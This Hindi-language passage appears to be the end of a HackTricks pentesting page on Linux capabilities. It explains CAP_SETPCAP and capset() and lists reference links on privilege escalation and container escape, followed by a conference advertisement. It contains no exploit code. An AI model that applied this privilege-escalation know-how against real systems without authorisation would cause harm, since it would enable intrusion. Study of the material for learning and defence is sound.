`CAP_SETPCAP` को सक्रिय रूप से उपयोग करने के लिए, आपको अपनी प्रभावी क्षमता सेट में क्षमता होनी चाहिए और लक्षित क्षमताएं अपनी अनुमत क्षमता सेट में होनी चाहिए। फिर आप `capset()` सिस्टम कॉल का उपयोग करके अन्य प्रक्रियाओं की क्षमता सेट को संशोधित कर सकते हैं।

सारांश में, `CAP_SETPCAP` एक प्रक्रिया को अन्य प्रक्रियाओं की क्षमता सेट को संशोधित करने की अनुमति देती है, लेकिन यह उन क्षमताओं को प्रदान नहीं कर सकती है जिनकी वह खुद के पास नहीं है। इसके अलावा, सुरक्षा संबंधी चिंताओं के कारण, हाल के कर्नल संस्करणों में इसकी क्षमता को केवल अपनी अनुमत क्षमता सेट या अपने वंशजों की अनुमत क्षमता सेट में क्षमताओं को कम करने की अनुमति है।

## संदर्भ

**इन उदाहरणों का अधिकांश** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **के कुछ प्रयोगशालाओं से लिए गए हैं**, इसलिए यदि आप इन प्रिवेस्क तकनीकों का अभ्यास करना चाहते हैं तो मैं इन प्रयोगशालाओं की सिफारिश करता हूं।

**अन्य संदर्भ**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस हर विषय में टेक्नोलॉजी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hack
